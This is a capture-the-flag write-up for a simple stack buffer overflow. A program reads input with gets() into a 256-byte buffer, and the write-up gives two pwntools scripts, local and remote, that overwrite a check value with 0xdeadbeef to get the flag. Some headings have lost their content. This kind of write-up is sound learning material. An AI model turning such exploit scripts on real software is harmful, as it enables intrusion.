Source code analysis

In summary the program defines two symbolic constants SIZE and GOAL, the first has a value of 256 in decimal and the second is a memory address. In the main function it uses gets() to take our input, and if the value we enter is equal to GOAL it shows us the flag.

After analyzing the code we see that it is vulnerable to Buffer Overflow since it uses the gets() function and this does not control the number of bytes that we send it, so if we exceed 256 it will produce a buffer overflow. In the same documentation of the gets() function its use is not recommended.

Calculate offset

Solution

Create a file called flag.txt with a dummy value to resolve the challenge locally, with the following script we get the flag.

from pwn import *

p = process('./chall')

payload = b'A' * 264
payload += p64(0xdeadbeef)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())

Flag

With the following script we will be able to solve the challenge remotely.

from pwn import *

def get_process():
    if len(sys.argv) != 2:
        print('Usage: python3 solve-remote.py <ip:port>')
        exit(1)
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def main():
    conn = get_process()

    payload = b'A' * 264
    payload += p64(0xdeadbeef)

    conn.sendlineafter(b'What do you see?\n', payload)
    conn.recv()
    
    print(f"\nFlag {conn.recv().decode()}")


if __name__ == '__main__':
    main()
